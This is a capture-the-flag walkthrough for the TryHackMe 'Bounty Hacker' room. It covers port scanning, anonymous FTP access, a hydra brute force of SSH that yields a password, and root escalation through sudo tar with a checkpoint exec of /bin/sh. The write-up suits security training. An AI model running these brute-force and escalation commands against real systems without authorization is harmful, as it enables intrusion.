<h2>Bounty Hacker</h2>
<ul>
    <li>Link to access the machine: https://tryhackme.com/room/cowboyhacker</li>
    <li>Free Machine</li>
    <li>Created by Sevuhl</li>
</ul>
<h2>1. Deploy the machine & Enumerate open ports</h2>

Run ```nmap -A (machine ip)```<br/>

| Port Number  | Service / Version |
| ------------- | ------------- |
| 21  | ftp / vsftpd 3.0.3  |
| 22  | ssh / OpenSSH 7.2p2  |
| 80 | http / Apache 2.4.18 |

<h2>2. Connect to ftp as anonymous</h2>

Run ```ftp (machine ip)
       Name: anonymous
       Login successful```

With ```ls``` command, we can see 2 files named ```locks.txt``` and ```task.txt```</br>
We can get this files using the ```mget *``` command</br>
For the question "Who wrote the task list? ", the answer can be found in the ```task.txt```

<h2>3. Bruteforce the SSH service</h2>

Run ```hydra -l lin -P locks.txt -t 4 ssh://10.10.16.154``` in order to bruteforce the ssh, using ```lin``` as id and ```locks.txt``` as passwords dictonary
</br>Finally, we get the password ```RedDr4gonSynd1cat3```

<h2>4. Connect in SSH as lin</h2>

Run ```ssh lin@(machine ip)```<br>
We can run ```ls``` and ```cat user.txt```<br>
>There is the flag

<h2>5. Privilege escalation</h2>

Let's run ```sudo -l``` in order to check sudo configuration as lin<br>
```
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

<br>We can see that lin can run ```tar``` as <b>root</b>
<br>On GTFOBins (https://gtfobins.github.io/), we can see that if we can run ```tar``` as <b>sudo</b>, we can <b>escalate privilege</b> with</br>
the command ```sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh```

<br>Let's run it

```bash
lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# whoami
root
```
<br>Now, we can ```cd root``` and access to the ```root.txt```
<br> Congraluations !
